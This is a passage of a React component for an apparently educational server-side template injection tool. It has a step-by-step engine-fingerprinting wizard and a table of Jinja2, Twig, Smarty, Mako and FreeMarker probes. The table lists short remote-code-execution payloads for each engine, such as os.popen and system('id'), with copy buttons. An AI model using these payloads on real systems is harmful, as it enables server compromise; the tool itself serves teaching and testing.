                      : "bg-muted/60 text-muted-foreground hover:bg-muted"
                  }`}
                >
                  ✓ Evaluated (49)
                </button>
                <button
                  onClick={() => {
                    setWizardStep1("literal");
                    setWizardStep2Bottom("49");
                    setWizardStep3Bottom("7777777");
                    applyPreset("temple");
                  }}
                  className={`flex-1 py-1.5 px-2 rounded-lg text-xs font-mono font-semibold transition-all cursor-pointer ${
                    wizardStep1 === "literal"
                      ? "bg-rose-500 text-white shadow-md font-bold"
                      : "bg-muted/60 text-muted-foreground hover:bg-muted"
                  }`}
                >
                  ✗ Literal / Ignored
                </button>
              </div>
            </div>

            {/* Step 2 */}
            <div className="rounded-xl border border-border bg-card p-4 space-y-3 shadow-md">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground font-semibold">
                  Step 02: Syntax Branch
                </span>
                <CopyButton text={wizardStep1 === "49" ? "a{*comment*}b" : "{{7*7}}"} />
              </div>
              <div className="font-mono text-xs font-bold text-sky-400 bg-muted/40 p-2 rounded-lg border border-border/50">
                {wizardStep1 === "49" ? "Probe: a{*comment*}b" : "Probe: {{7*7}}"}
              </div>
              <p className="text-xs text-muted-foreground">
                {wizardStep1 === "49"
                  ? "Does the output strip the comment tag and return 'ab'?"
                  : "Does injecting double curly braces evaluate to 49?"}
              </p>
              <div className="flex gap-2 pt-1">
                <button
                  onClick={() => {
                    if (wizardStep1 === "49") {
                      setWizardStep2Top("ab");
                      applyPreset("smarty");
                    } else {
                      setWizardStep2Bottom("49");
                      applyPreset("temple");
                    }
                  }}
                  className={`flex-1 py-1.5 px-2 rounded-lg text-xs font-mono font-semibold transition-all cursor-pointer ${
                    (wizardStep1 === "49" && wizardStep2Top === "ab") ||
                    (wizardStep1 === "literal" && wizardStep2Bottom === "49")
                      ? "bg-emerald-500 text-black shadow-md font-bold"
                      : "bg-muted/60 text-muted-foreground hover:bg-muted"
                  }`}
                >
                  ✓ Evaluated / Stripped
                </button>
                <button
                  onClick={() => {
                    if (wizardStep1 === "49") {
                      setWizardStep2Top("literal");
                      applyPreset("mako");
                    } else {
                      setWizardStep2Bottom("literal");
                      applyPreset("safe");
                    }
                  }}
                  className={`flex-1 py-1.5 px-2 rounded-lg text-xs font-mono font-semibold transition-all cursor-pointer ${
                    (wizardStep1 === "49" && wizardStep2Top === "literal") ||
                    (wizardStep1 === "literal" && wizardStep2Bottom === "literal")
                      ? "bg-rose-500 text-white shadow-md font-bold"
                      : "bg-muted/60 text-muted-foreground hover:bg-muted"
                  }`}
                >
                  ✗ Literal / Failed
                </button>
              </div>
            </div>

            {/* Step 3 */}
            <div className="rounded-xl border border-border bg-card p-4 space-y-3 shadow-md">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground font-semibold">
                  Step 03: Engine Disambiguation
                </span>
                <CopyButton
                  text={wizardStep1 === "49" ? "${'z'.join('ab')}" : "{{7*'7'}}"}
                />
              </div>
              <div className="font-mono text-xs font-bold text-sky-400 bg-muted/40 p-2 rounded-lg border border-border/50">
                {wizardStep1 === "49" ? 'Probe: ${\"z\".join(\"ab\")}' : "Probe: {{7*'7'}}"}
              </div>
              <p className="text-xs text-muted-foreground">
                {wizardStep1 === "49"
                  ? "Tests Mako native Python string join execution."
                  : "Differentiates Jinja2 string repetition ('7777777') from Twig numeric cast (49)."}
              </p>
              <div className="flex flex-col gap-2 pt-1">
                {wizardStep1 === "literal" ? (
                  <>
                    <button
                      onClick={() => {
                        setWizardStep3Bottom("7777777");
                        applyPreset("temple");
                      }}
                      className={`py-1.5 px-2.5 rounded-lg text-xs font-mono font-semibold transition-all text-left cursor-pointer ${
                        wizardStep3Bottom === "7777777"
                          ? "bg-emerald-500 text-black shadow-md font-bold"
                          : "bg-muted/60 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      '7777777' ➔ Jinja2 (Python) [Temple Target]
                    </button>
                    <button
                      onClick={() => {
                        setWizardStep3Bottom("49");
                        applyPreset("twig");
                      }}
                      className={`py-1.5 px-2.5 rounded-lg text-xs font-mono font-semibold transition-all text-left cursor-pointer ${
                        wizardStep3Bottom === "49"
                          ? "bg-blue-500 text-white shadow-md font-bold"
                          : "bg-muted/60 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      49 ➔ Twig (PHP)
                    </button>
                  </>
                ) : (
                  <>
                    <button
                      onClick={() => {
                        setWizardStep3Mako("azb");
                        applyPreset("mako");
                      }}
                      className={`py-1.5 px-2.5 rounded-lg text-xs font-mono font-semibold transition-all text-left cursor-pointer ${
                        wizardStep3Mako === "azb"
                          ? "bg-purple-500 text-white shadow-md font-bold"
                          : "bg-muted/60 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      'azb' ➔ Mako (Python)
                    </button>
                    <button
                      onClick={() => {
                        setWizardStep3Mako("literal");
                        applyPreset("freemarker");
                      }}
                      className={`py-1.5 px-2.5 rounded-lg text-xs font-mono font-semibold transition-all text-left cursor-pointer ${
                        wizardStep3Mako === "literal"
                          ? "bg-amber-500 text-black shadow-md font-bold"
                          : "bg-muted/60 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      Error ➔ Unknown / FreeMarker (Java)
                    </button>
                  </>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── Tab Content 3: Engine Comparison Matrix ────────────────────────── */}
      {activeTab === "matrix" && (
        <div className="p-4 md:p-6 overflow-x-auto">
          <table className="w-full text-left text-xs font-sans border-collapse">
            <thead>
              <tr className="border-b border-border bg-muted/40 font-mono text-muted-foreground">
                <th className="p-3">Engine</th>
                <th className="p-3">Stack</th>
                <th className="p-3">Probe Behavior</th>
                <th className="p-3">Key Frameworks</th>
                <th className="p-3">Canonical RCE Vector</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border/40 font-mono">
              <tr
                onClick={() => applyPreset("temple")}
                className="hover:bg-emerald-500/10 transition-colors cursor-pointer"
              >
                <td className="p-3 font-bold text-emerald-400 flex items-center gap-1.5">
                  <span className="text-[10px]">⭐</span> Jinja2
                </td>
                <td className="p-3">Python</td>
                <td className="p-3 text-muted-foreground">
                  {"{{7*'7'}}"} ➔ <span className="text-emerald-300 font-bold">'7777777'</span>
                </td>
                <td className="p-3 text-muted-foreground">Flask, Django, FastAPI</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    cycler.__init__.__globals__['os'].popen()
                  </code>
                </td>
              </tr>
              <tr
                onClick={() => applyPreset("twig")}
                className="hover:bg-blue-500/10 transition-colors cursor-pointer"
              >
                <td className="p-3 font-bold text-blue-400">Twig</td>
                <td className="p-3">PHP</td>
                <td className="p-3 text-muted-foreground">
                  {"{{7*'7'}}"} ➔ <span className="text-blue-300 font-bold">49</span> (loose coercion)
                </td>
                <td className="p-3 text-muted-foreground">Symfony, Craft CMS</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    _self.env.registerUndefinedFilterCallback()
                  </code>
                </td>
              </tr>
              <tr
                onClick={() => applyPreset("smarty")}
                className="hover:bg-emerald-500/10 transition-colors cursor-pointer"
              >
                <td className="p-3 font-bold text-emerald-400">Smarty</td>
                <td className="p-3">PHP</td>
                <td className="p-3 text-muted-foreground">
                  {"a{*comment*}b"} ➔ <span className="text-emerald-300 font-bold">'ab'</span>
                </td>
                <td className="p-3 text-muted-foreground">PrestaShop, Legacy PHP</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    {"{system('id')}"} / writeFile
                  </code>
                </td>
              </tr>
              <tr
                onClick={() => applyPreset("mako")}
                className="hover:bg-purple-500/10 transition-colors cursor-pointer"
              >
                <td className="p-3 font-bold text-purple-400">Mako</td>
                <td className="p-3">Python</td>
                <td className="p-3 text-muted-foreground">
                  {"${'z'.join('ab')}"} ➔ <span className="text-purple-300 font-bold">'azb'</span>
                </td>
                <td className="p-3 text-muted-foreground">Pyramid, Pylons</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    {"${__import__('os').popen('id').read()}"}
                  </code>
                </td>
              </tr>
              <tr
                onClick={() => applyPreset("freemarker")}
                className="hover:bg-amber-500/10 transition-colors cursor-pointer"
              >
                <td className="p-3 font-bold text-amber-400">FreeMarker</td>
                <td className="p-3">Java</td>
                <td className="p-3 text-muted-foreground">
                  {"${7*7}"} ➔ <span className="text-amber-300 font-bold">49</span> (Java syntax)
                </td>
                <td className="p-3 text-muted-foreground">Spring, Liferay, Java EE</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>"}
                  </code>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      )}

      {/* ── Engine Dossier & RCE Payload Inspector ─────────────────────────── */}
      <div className="border-t border-border bg-background/85 p-5 md:p-6 space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-3">
            <div className="flex h-7 w-7 items-center justify-center rounded-lg bg-accent-primary text-background font-bold text-xs shadow-sm">
              <Cpu className="h-4 w-4" />
            </div>
            <div>
              <span className="text-xs font-bold uppercase tracking-wider text-foreground font-mono">
                Active Diagnostic Dossier:{" "}
                <span className="text-accent-primary font-bold">{activeEngine.name}</span>
              </span>
              <span className="ml-2.5 text-[11px] text-muted-foreground font-mono">
                Stack: {activeEngine.language}
              </span>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-1.5">
            {activeEngine.frameworks.map((fw, idx) => (
              <span
                key={idx}
                className="rounded-md border border-border/60 bg-muted/40 px-2 py-0.5 text-[10px] font-mono text-muted-foreground"
              >
                {fw}
              </span>
            ))}
          </div>
        </div>

        {/* Behavior Explanation & Exploit Vector */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs leading-relaxed">
          <div className="space-y-2 rounded-xl border border-border/60 bg-card/60 p-4">
            <div className="font-semibold text-foreground flex items-center gap-1.5 border-b border-border/40 pb-2">
              <HelpCircle className="h-4 w-4 text-sky-400" />
              <span>Engine Identification Mechanics</span>
            </div>
            <p className="text-muted-foreground font-mono text-[11px] bg-muted/30 p-2 rounded border border-border/40 text-foreground">
              {activeEngine.probeBehavior}
            </p>
            <p className="text-muted-foreground text-[11px] pt-1">
              {activeEngine.description}
            </p>
          </div>

          <div className="space-y-2 rounded-xl border border-border/60 bg-card/60 p-4">
            <div className="flex items-center justify-between border-b border-border/40 pb-2">
              <span className="font-semibold text-foreground flex items-center gap-1.5">
                <Code2 className="h-4 w-4 text-accent-primary" />
                <span>Canonical RCE Vector</span>
              </span>
              <CopyButton text={activeEngine.rceSnippet} />
            </div>

            <div className="relative rounded-lg bg-muted/60 p-3 border border-border/60 overflow-x-auto">
              <code className="font-mono text-[11px] text-accent-primary block whitespace-pre-wrap break-all">
                {activeEngine.rceSnippet}
              </code>
            </div>

            {activeEngine.templeNote ? (
              <div className="flex items-start gap-1.5 text-[11px] text-amber-300/90 bg-amber-500/10 p-2.5 rounded-lg border border-amber-500/20">
                <AlertTriangle className="h-3.5 w-3.5 text-amber-400 shrink-0 mt-0.5" />
                <span>{activeEngine.templeNote}</span>
              </div>
            ) : (
              <span className="text-[10px] text-muted-foreground block">
                Standard payload assumes unrestricted template execution environment.
              </span>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
